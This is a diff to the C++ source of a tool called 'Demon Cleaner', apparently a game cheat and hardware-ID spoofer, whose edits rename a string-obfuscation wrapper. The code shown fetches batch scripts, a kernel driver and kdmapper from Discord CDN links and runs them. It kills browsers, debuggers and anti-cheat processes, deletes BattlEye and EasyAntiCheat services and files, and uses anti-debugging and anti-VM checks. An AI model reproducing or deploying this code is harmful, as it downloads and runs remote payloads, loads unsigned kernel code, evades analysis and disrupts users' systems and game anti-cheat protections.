@@ -111,7 +111,7 @@ void adbg_GetTickCount(void)
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO x32dbg Detected. && TIMEOUT 10 >nul").c_str());
+        system(dead("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO x32dbg Detected. && TIMEOUT 10 >nul").c_str());
         SetLastError(1);
         exit(0);
     }
@@ -135,7 +135,7 @@ void DBG_MSG(WORD dbg_code, const char* message)
         TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
         TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
         TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-    system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO x32dbg Detected. && TIMEOUT 10 >nul").c_str());
+    system(dead("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO x32dbg Detected. && TIMEOUT 10 >nul").c_str());
     SetLastError(1);
     exit(0);
 #endif
@@ -169,7 +169,7 @@ void adbg_CheckRemoteDebuggerPresent(void)
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO x32dbg Detected. && TIMEOUT 10 >nul").c_str());
+        system(dead("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO x32dbg Detected. && TIMEOUT 10 >nul").c_str());
         SetLastError(1);
         exit(0);
     }
@@ -313,7 +313,7 @@ void apex()
 
     JUNK_CODE_ONE
         JUNK_CODE_ONE
-        std::string apex = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114575800954941/apex.bat"));
+        std::string apex = (dead("https://cdn.discordapp.com/attachments/834754431249285140/880114575800954941/apex.bat"));
     std::string apexpath = "C:\\Windows\\Vss\\Apex.bat";
     URLDownloadToFileA(NULL, apex.c_str(), apexpath.c_str(), 0, NULL);
     system("cd C:\\Windows\\Vss\\");
@@ -339,7 +339,7 @@ void gta()
     tlmisir();
 
 
-    std::string gta = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114574483918858/gta.bat"));
+    std::string gta = (dead("https://cdn.discordapp.com/attachments/834754431249285140/880114574483918858/gta.bat"));
     std::string gtapath = "C:\\Windows\\Vss\\gta.bat";
     URLDownloadToFileA(NULL, gta.c_str(), gtapath.c_str(), 0, NULL);
     system("cd C:\\Windows\\Vss\\");
@@ -364,7 +364,7 @@ void fortnite()
     tlmisir();
 
 
-    std::string fortnite = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114573007527946/Fortnite.bat"));
+    std::string fortnite = (dead("https://cdn.discordapp.com/attachments/834754431249285140/880114573007527946/Fortnite.bat"));
     std::string fortnitepath = "C:\\Windows\\Vss\\Fortnite.bat";
     URLDownloadToFileA(NULL, fortnite.c_str(), fortnitepath.c_str(), 0, NULL);
     system("cd C:\\Windows\\Vss\\");
@@ -387,7 +387,7 @@ void fishingplanet()
     lnttirs();
     tlmisir();
 
-    std::string fishingplanet = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114571648593931/fishing-planet.bat"));
+    std::string fishingplanet = (dead("https://cdn.discordapp.com/attachments/834754431249285140/880114571648593931/fishing-planet.bat"));
     std::string fishingplanetpath = "C:\\Windows\\Vss\\Fishing-planet.bat";
     URLDownloadToFileA(NULL, fishingplanet.c_str(), fishingplanetpath.c_str(), 0, NULL);
     system("cd C:\\Windows\Vss\\");
@@ -411,7 +411,7 @@ void cod()
     lnttirs();
     tlmisir();
 
-    std::string cod = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114570369318962/Cold-Ware.bat"));
+    std::string cod = (dead("https://cdn.discordapp.com/attachments/834754431249285140/880114570369318962/Cold-Ware.bat"));
     std::string codpath = "C:\\Windows\\Vss\\Cold-Ware.bat";
     URLDownloadToFileA(NULL, cod.c_str(), codpath.c_str(), 0, NULL);
     system("cd C:\\Windows\\Vss\\");
@@ -437,110 +437,110 @@ void cleaner() {
     lnttirs();
     tlmisir();
 
-    system(XorStr("taskkill /F /IM CCleaner64.exe 2>NULL").c_str());
-    system(XorStr("taskkill /F /IM WargamingErrorMonitor.exe 2>NULL").c_str());
-    system(XorStr("taskkill /F /IM wargamingerrormonitor.exe 2>NULL").c_str());
-    system(XorStr("taskkill /F /IM WorldOfTanks.exe 2>NULL").c_str());
-    system(XorStr("taskkill /F /IM chrome.exe 2>NULL").c_str());
-    system(XorStr("taskkill /F /IM msedge.exe 2>NULL").c_str());
-    system(XorStr("taskkill /F /IM discord.exe 2>NULL").c_str());
-    system(XorStr("taskkill /F /IM firefox.exe 2>NULL").c_str());
-    system(XorStr("taskkill /F /IM brave.exe 2>NULL").c_str());
-    system(XorStr("taskkill /F /IM opera.exe 2>NULL").c_str());
-    system(XorStr("taskkill /F /IM EpicGamesLauncher.exe 2>NULL").c_str());
-    system(XorStr("taskkill /F /IM vmware-hostd.exe 2>NULL").c_str());
-    system(XorStr("taskkill /F /IM vmware-authd.exe 2>NULL").c_str());
-    system(XorStr("taskkill /F /IM vmnat.exe 2>NULL").c_str());
-    system(XorStr("taskkill /F /IM Spotify.exe 2>NULL").c_str());
-    system(XorStr("taskkill /F /IM wcg.exe 2>NULL").c_str());
-    system(XorStr("taskkill /F /IM UnrealCEFSubProcess.exe 2>NULL").c_str());
-    system(XorStr("taskkill /F /IM CEFProcess.exe 2>NULL").c_str());
-    system(XorStr("taskkill /F /IM CEFProcess.exe 2>NULL").c_str());
-    system(XorStr("taskkill /F /IM BEServices.exe 2>NULL").c_str());
-    system(XorStr("taskkill /F /IM BattleEye.exe 2>NULL").c_str());
-    system(XorStr("taskkill /F /IM epicgameslauncher.exe 2>NULL").c_str());
-    system(XorStr("taskkill /F /IM FortniteClient-Win64-Shipping_EAC.exe 2>NULL").c_str());
-    system(XorStr("taskkill /F /IM FortniteClient-Win64-Shipping.exe 2>NULL").c_str());
-    system(XorStr("taskkill /F /IM FortniteClient-Win64-Shipping_BE.exe 2>NULL").c_str());
-    system(XorStr("taskkill /F /IM FortniteLauncher.exe 2>NULL").c_str());
-    system(XorStr("taskkill /F /IM r5apex.exe 2>NULL").c_str());
-    system(XorStr("del /F /IM C:\\Windows\\Capcom.sys 2>NULL").c_str());
-    system(XorStr("del /F /IM del /f %temp%\* 2>NULL").c_str());
-    system(XorStr("del /F /IM D:\\steam\\depotcache\\* 2>NULL").c_str());
-    system(XorStr("del /F /IM C:\\Program Files (x86)\\EasyAntiCheat\\EasyAntiCheat.exe 2>NULL").c_str());
-    system(XorStr("del /F /IM C:\\Program Files (x86)\\EasyAntiCheat\\EasyAntiCheat.sys 2>NULL").c_str());
-    system(XorStr("del /F /IM C:\\Windows\\KsDumperDriver.sys 2>NULL").c_str());
-    system(XorStr("del /F /IM C:\\Windows\\System32\\Capcom.sys 2>NULL").c_str());
-    system(XorStr("del /F /IM C:\\Windows\\System32\KsDumperDriver.sys 2>NULL").c_str());
-    system(XorStr("taskkill /F /IM openvpnserv.exe 2>NULL").c_str());
-    system(XorStr("taskkill /F /IM LockApp.exe 2>NULL").c_str());
-    system(XorStr("taskkill /F /IM vmware.exe 2>NULL").c_str());
-    system(XorStr("taskkill /F /IM openvpnserv.exe 2>NULL").c_str());
-    system(XorStr("taskkill /f /im KsDumperClient.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im KsDumper.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im GameOverlayUI.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im FolderChangesView.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im steamservice.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im Lightshot.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im steamwebhelper.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im PerfWatson2.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im vmware-tray.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im ProcessHacker.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im procmon.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im YourPhone.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im idaq.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im wallpaper64.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im wallpaper32.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im OneDrive.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im uTorrent.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im helper.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im idaq64.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im Wireshark.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im Fiddler.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im FiddlerEverywhere.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im Xenos64.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im die.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im Xenos.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im Xenos32.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im de4dot.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im Cheat Engine.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im HTTP Debugger Windows Service (32 bit).exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im KsDumper.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im client.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im OllyDbg.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im x64dbg.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im x32dbg.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im EasyAntiCheat.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im BEService.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im FACEIT.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im PnkBstrA.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im PnkBstrB.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im Client.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im FortniteClient-Win64-Shipping.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im FortniteClient-Win64-Shipping_BE.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im FortniteClient-Win64-Shipping_EAC.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im EpicGamesLauncher.exe >nul 2>&1").c_str());
-    system(XorStr("sc stop BEService >nul 2>&1").c_str());
-    system(XorStr("sc delete BEService >nul 2>&1").c_str());
-    system(XorStr("sc stop BEDaisy >nul 2>&1").c_str());
-    system(XorStr("sc delete BEDaisy >nul 2>&1").c_str());
-    system(XorStr("sc stop EasyAntiCheat >nul 2>&1").c_str());
-    system(XorStr("sc stop EasyAntiCheatSys >nul 2>&1").c_str());
-    system(XorStr("sc delete EasyAntiCheat >nul 2>&1").c_str());
-    system(XorStr("sc delete EasyAntiCheatSys >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im FortniteLauncher.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im RiotClientServices.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im VALORANT.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im RainbowSix.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im csgo.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im RainbowSix_BE.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1").c_str());
-    system(XorStr("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1").c_str());
-    system(XorStr("sc stop HTTPDebuggerPro >nul 2>&1").c_str());
-    system(XorStr("sc delete HTTPDebuggerPro >nul 2>&1").c_str());
-    system(XorStr("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1").c_str());
+    system(dead("taskkill /F /IM CCleaner64.exe 2>NULL").c_str());
+    system(dead("taskkill /F /IM WargamingErrorMonitor.exe 2>NULL").c_str());
+    system(dead("taskkill /F /IM wargamingerrormonitor.exe 2>NULL").c_str());
+    system(dead("taskkill /F /IM WorldOfTanks.exe 2>NULL").c_str());
+    system(dead("taskkill /F /IM chrome.exe 2>NULL").c_str());
+    system(dead("taskkill /F /IM msedge.exe 2>NULL").c_str());
+    system(dead("taskkill /F /IM discord.exe 2>NULL").c_str());
+    system(dead("taskkill /F /IM firefox.exe 2>NULL").c_str());
+    system(dead("taskkill /F /IM brave.exe 2>NULL").c_str());
+    system(dead("taskkill /F /IM opera.exe 2>NULL").c_str());
+    system(dead("taskkill /F /IM EpicGamesLauncher.exe 2>NULL").c_str());
+    system(dead("taskkill /F /IM vmware-hostd.exe 2>NULL").c_str());
+    system(dead("taskkill /F /IM vmware-authd.exe 2>NULL").c_str());
+    system(dead("taskkill /F /IM vmnat.exe 2>NULL").c_str());
+    system(dead("taskkill /F /IM Spotify.exe 2>NULL").c_str());
+    system(dead("taskkill /F /IM wcg.exe 2>NULL").c_str());
+    system(dead("taskkill /F /IM UnrealCEFSubProcess.exe 2>NULL").c_str());
+    system(dead("taskkill /F /IM CEFProcess.exe 2>NULL").c_str());
+    system(dead("taskkill /F /IM CEFProcess.exe 2>NULL").c_str());
+    system(dead("taskkill /F /IM BEServices.exe 2>NULL").c_str());
+    system(dead("taskkill /F /IM BattleEye.exe 2>NULL").c_str());
+    system(dead("taskkill /F /IM epicgameslauncher.exe 2>NULL").c_str());
+    system(dead("taskkill /F /IM FortniteClient-Win64-Shipping_EAC.exe 2>NULL").c_str());
+    system(dead("taskkill /F /IM FortniteClient-Win64-Shipping.exe 2>NULL").c_str());
+    system(dead("taskkill /F /IM FortniteClient-Win64-Shipping_BE.exe 2>NULL").c_str());
+    system(dead("taskkill /F /IM FortniteLauncher.exe 2>NULL").c_str());
+    system(dead("taskkill /F /IM r5apex.exe 2>NULL").c_str());
+    system(dead("del /F /IM C:\\Windows\\Capcom.sys 2>NULL").c_str());
+    system(dead("del /F /IM del /f %temp%\* 2>NULL").c_str());
+    system(dead("del /F /IM D:\\steam\\depotcache\\* 2>NULL").c_str());
+    system(dead("del /F /IM C:\\Program Files (x86)\\EasyAntiCheat\\EasyAntiCheat.exe 2>NULL").c_str());
+    system(dead("del /F /IM C:\\Program Files (x86)\\EasyAntiCheat\\EasyAntiCheat.sys 2>NULL").c_str());
+    system(dead("del /F /IM C:\\Windows\\KsDumperDriver.sys 2>NULL").c_str());
+    system(dead("del /F /IM C:\\Windows\\System32\\Capcom.sys 2>NULL").c_str());
+    system(dead("del /F /IM C:\\Windows\\System32\KsDumperDriver.sys 2>NULL").c_str());
+    system(dead("taskkill /F /IM openvpnserv.exe 2>NULL").c_str());
+    system(dead("taskkill /F /IM LockApp.exe 2>NULL").c_str());
+    system(dead("taskkill /F /IM vmware.exe 2>NULL").c_str());
+    system(dead("taskkill /F /IM openvpnserv.exe 2>NULL").c_str());
+    system(dead("taskkill /f /im KsDumperClient.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im KsDumper.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im GameOverlayUI.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im FolderChangesView.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im steamservice.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im Lightshot.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im steamwebhelper.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im PerfWatson2.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im vmware-tray.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im ProcessHacker.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im procmon.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im YourPhone.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im idaq.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im wallpaper64.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im wallpaper32.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im OneDrive.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im uTorrent.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im helper.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im idaq64.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im Wireshark.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im Fiddler.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im FiddlerEverywhere.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im Xenos64.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im die.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im Xenos.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im Xenos32.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im de4dot.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im Cheat Engine.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im HTTP Debugger Windows Service (32 bit).exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im KsDumper.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im client.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im OllyDbg.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im x64dbg.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im x32dbg.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im EasyAntiCheat.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im BEService.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im FACEIT.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im PnkBstrA.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im PnkBstrB.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im Client.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im FortniteClient-Win64-Shipping.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im FortniteClient-Win64-Shipping_BE.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im FortniteClient-Win64-Shipping_EAC.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im EpicGamesLauncher.exe >nul 2>&1").c_str());
+    system(dead("sc stop BEService >nul 2>&1").c_str());
+    system(dead("sc delete BEService >nul 2>&1").c_str());
+    system(dead("sc stop BEDaisy >nul 2>&1").c_str());
+    system(dead("sc delete BEDaisy >nul 2>&1").c_str());
+    system(dead("sc stop EasyAntiCheat >nul 2>&1").c_str());
+    system(dead("sc stop EasyAntiCheatSys >nul 2>&1").c_str());
+    system(dead("sc delete EasyAntiCheat >nul 2>&1").c_str());
+    system(dead("sc delete EasyAntiCheatSys >nul 2>&1").c_str());
+    system(dead("taskkill /f /im FortniteLauncher.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im RiotClientServices.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im VALORANT.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im RainbowSix.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im csgo.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im RainbowSix_BE.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1").c_str());
+    system(dead("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1").c_str());
+    system(dead("sc stop HTTPDebuggerPro >nul 2>&1").c_str());
+    system(dead("sc delete HTTPDebuggerPro >nul 2>&1").c_str());
+    system(dead("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1").c_str());
 
 }
 void deleter()
@@ -563,13 +563,13 @@ void deleter()
 
     //delete the files we downloaded
     system("cd C:\\Windows\Vss\\");
-    system(XorStr("del C:\\Windows\\Vss\\woof.sys").c_str());
-    system(XorStr("del C:\\Windows\\Vss\\mapper.exe").c_str());
-    system(XorStr("del C:\\Windows\\Vss\\Cold-Ware.bat").c_str());
-    system(XorStr("del C:\\Windows\\Vss\\Fishing-Planet.bat").c_str());
-    system(XorStr("del C:\\Windows\\Vss\\Apex.bat").c_str());
-    system(XorStr("del C:\\Windows\\Vss\\gta.bat").c_str());
-    system(XorStr("del C:\\Windows\\Vss\\Fortnite.bat").c_str());
+    system(dead("del C:\\Windows\\Vss\\woof.sys").c_str());
+    system(dead("del C:\\Windows\\Vss\\mapper.exe").c_str());
+    system(dead("del C:\\Windows\\Vss\\Cold-Ware.bat").c_str());
+    system(dead("del C:\\Windows\\Vss\\Fishing-Planet.bat").c_str());
+    system(dead("del C:\\Windows\\Vss\\Apex.bat").c_str());
+    system(dead("del C:\\Windows\\Vss\\gta.bat").c_str());
+    system(dead("del C:\\Windows\\Vss\\Fortnite.bat").c_str());
 
 
 }
@@ -591,7 +591,7 @@ void safeshutdown()
     lnttirs();
     tlmisir();
 
-    system(XorStr("cls").c_str());
+    system(dead("cls").c_str());
 
     string a;
     std::cout << RED << "\nunloading kernel modules";
@@ -600,7 +600,7 @@ void safeshutdown()
     Sleep(1450);
     std::cout << CYAN << "\nunloading from memory";
     Sleep(2400);
-    system(XorStr("cls").c_str());
+    system(dead("cls").c_str());
     std::cout << "Do you want to restart your pc? \nYes/No : ";
     cin >> a;
     if (GetAsyncKeyState(VK_END))
@@ -620,7 +620,7 @@ void safeshutdown()
     }
     if (a == "Yes" || a == "yes")
     {
-        system(XorStr("shutdown -r").c_str());
+        system(dead("shutdown -r").c_str());
         exit(0);
     }
 
@@ -660,7 +660,7 @@ _T("\\\\.\\KsDumper")
         HANDLE hFile = CreateFile(devices[i], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
         TCHAR msg[256] = _T("");
         if (hFile != INVALID_HANDLE_VALUE) {
-            system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO KsDumper Detected. && TIMEOUT 10 >nul").c_str());
+            system(dead("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO KsDumper Detected. && TIMEOUT 10 >nul").c_str());
             SetLastError(1);
             exit(0);
         }
@@ -691,11 +691,11 @@ void spoofer()
 
 
 
-    string spoofer = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/881227464498630677/NewWoof.sys"));
+    string spoofer = (dead("https://cdn.discordapp.com/attachments/834754431249285140/881227464498630677/NewWoof.sys"));
     string spooferpath = "C:\\Windows\\Vss\\woof.sys";
     URLDownloadToFileA(NULL, spoofer.c_str(), spooferpath.c_str(), 0, NULL);
 
-    string mapper = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/879745681294786600/kdmapper.exe"));
+    string mapper = (dead("https://cdn.discordapp.com/attachments/834754431249285140/879745681294786600/kdmapper.exe"));
     string mapperpath = "C:\\Windows\\Vss\\mapper.exe";
     URLDownloadToFileA(NULL, mapper.c_str(), mapperpath.c_str(), 0, NULL);
     system("cd C:\\Windows\\Vss\\");
@@ -706,17 +706,17 @@ void spoofer()
     rydekem();
     lnttirs();
     tlmisir();
-    system(XorStr("NETSH WINSOCK RESET").c_str());
-    system(XorStr("NETSH INT IP RESET").c_str());
-    system(XorStr("NETSH INTERFACE IPV4 RESET").c_str());
-    system(XorStr("NETSH INTERFACE IPV6 RESET").c_str());
-    system(XorStr("NETSH INTERFACE TCP RESET").c_str());
-    system(XorStr("IPCONFIG /RELEASE").c_str());
-    system(XorStr("IPCONFIG /RELEASE").c_str());
-    system(XorStr("IPCONFIG /RENEW").c_str());
-    system(XorStr("IPCONFIG /FLUSHDNS").c_str());
-    system(XorStr("IPCONFIG /RENEW").c_str());
-    system(XorStr("cls").c_str());
+    system(dead("NETSH WINSOCK RESET").c_str());
+    system(dead("NETSH INT IP RESET").c_str());
+    system(dead("NETSH INTERFACE IPV4 RESET").c_str());
+    system(dead("NETSH INTERFACE IPV6 RESET").c_str());
+    system(dead("NETSH INTERFACE TCP RESET").c_str());
+    system(dead("IPCONFIG /RELEASE").c_str());
+    system(dead("IPCONFIG /RELEASE").c_str());
+    system(dead("IPCONFIG /RENEW").c_str());
+    system(dead("IPCONFIG /FLUSHDNS").c_str());
+    system(dead("IPCONFIG /RENEW").c_str());
+    system(dead("cls").c_str());
     safeshutdown();
 }
 
@@ -761,8 +761,8 @@ void loadserial()
     tlmisir();
 
 
-    serial.push_back(XorStr("384604182").c_str());
-    serial.push_back(XorStr("2953439145").c_str());
+    serial.push_back(dead("384604182").c_str());
+    serial.push_back(dead("2953439145").c_str());
     rydekem();
     lnttirs();
     tlmisir();
@@ -857,23 +857,23 @@ void mainbot()
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
 
             SetConsoleTitle(_T("Demon Cleaner V1.0 [server sided build]"));
-            setcolor(12);
-            std::cout << " _| |___ _____ ___ ___ \n";
-            std::cout << "| . | -_|     | . |   |\n";
-            std::cout << "|___|___|_|_|_|___|_|_|  coded by c75#0664\n";
+            setcolor(9);
+            std::cout << " _| |___ _____ ___ ___   ------------------            \n";
+            std::cout << "| . | -_|     | . |   |  | demoncleaner.gq| \n";
+            std::cout << "|___|___|_|_|_|___|_|_|  ------------------  \n";
 
             std::cout << "\n";
 
            
             std::cout << CYAN << "Demon Cleaner V1.0\n";
             Sleep(2000);
-            std::cout << RED << "\nloading kernel modules...\n";
+            std::cout << RED << "\nstarting connection...\n";
             Sleep(2000);
             std::cout << RED << "\nloading resources...\n";
             Sleep(1000);
             std::cout << RED << "\nloading in sockets...";
             Sleep(2400);
-            system(XorStr("cls").c_str());
+            system(dead("cls").c_str());
             rydekem();
             lnttirs();
             tlmisir();
@@ -926,7 +926,7 @@ void mainbot()
             lnttirs();
             tlmisir();
 
-            system(XorStr("cls").c_str());
+            system(dead("cls").c_str());
             std::cout << CYAN << "Sorry but you are not in our database. " << std::endl;
             std::cout << GREEN << "serial : ";
             std::cout << serialNumber << std::endl;
@@ -1121,7 +1121,7 @@ void startup()
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO Debugger Detected. && TIMEOUT 10 >nul").c_str());
+        system(dead("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO Debugger Detected. && TIMEOUT 10 >nul").c_str());
         SetLastError(1);
         exit(0);
     }
@@ -1144,7 +1144,7 @@ void startup()
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO Debugger Detected. && TIMEOUT 10 >nul").c_str());
+        system(dead("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO Debugger Detected. && TIMEOUT 10 >nul").c_str());
         SetLastError(1);
         exit(0);
     }
@@ -1168,7 +1168,7 @@ void startup()
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO x32dbg Detected. && TIMEOUT 10 >nul").c_str());
+        system(dead("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO x32dbg Detected. && TIMEOUT 10 >nul").c_str());
         SetLastError(1);
         exit(0);
 
@@ -1193,7 +1193,7 @@ void startup()
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO VMware Workstation Detected. && TIMEOUT 10 >nul").c_str());
+        system(dead("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO VMware Workstation Detected. && TIMEOUT 10 >nul").c_str());
         SetLastError(1);
         exit(0);
 
@@ -1295,7 +1295,7 @@ int main()
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE IDA detected && ECHO IDA Decompiler detected. && TIMEOUT 10 >nul").c_str());
